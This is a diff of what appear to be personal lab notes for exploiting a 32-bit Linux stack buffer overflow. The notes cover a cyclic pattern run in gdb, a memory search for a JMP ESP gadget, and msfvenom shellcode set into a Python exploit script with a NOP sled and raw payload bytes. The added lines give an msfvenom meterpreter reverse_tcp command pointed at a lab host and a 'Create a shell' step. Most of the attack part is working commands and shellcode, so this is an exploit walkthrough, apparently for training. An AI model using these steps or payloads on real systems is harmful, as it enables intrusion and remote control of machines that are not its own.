@@ -375,13 +375,11 @@ wiremask buffer overflow pattern
 gdb ./func
 run <<< $(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
 
-
-
 env - gdb ./func
 show env 
 unset env COLUMNS/LINES
 run
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 info proc map
 
 find /b (start of HEAP to end of Stack) 0x56558000, 0xffffe000, 0xff(JMP), 0xe4(ESP)
@@ -389,9 +387,10 @@ find /b (start of HEAP to end of Stack) 0x56558000, 0xffffe000, 0xff(JMP), 0xe4(
 find address put in script
 
 0x56555683
-0x56556683
 
 invert the registers for the payload
+
+0x83565556
 
 Create Payload
 msfvenom -p linux/x86/exec CMD=ifconfig -b '\x80' -f python
@@ -402,13 +401,14 @@ put payload in script
   buf +="\x90" * 10
 
 # Shell Code / Payload below
-# msfvenom -p linux/x86/exec CMD=ifconfig -b '\x80' -f python
+# msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
 
   buf += b"\xdb\xc1\xd9\x74\x24\xf4\x5a\xbe\x25\xcb\x13\x0e"
   buf += b"\x33\xc9\xb1\x0c\x31\x72\x17\x03\x72\x17\x83\xe7"
   buf += b"\xcf\xf1\xfb\x8d\xc4\xad\x9a\x03\xbd\x25\xb0\xc0"
 
-
+ # msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b '\x00' -f python
+- Create a shell
 
 
 
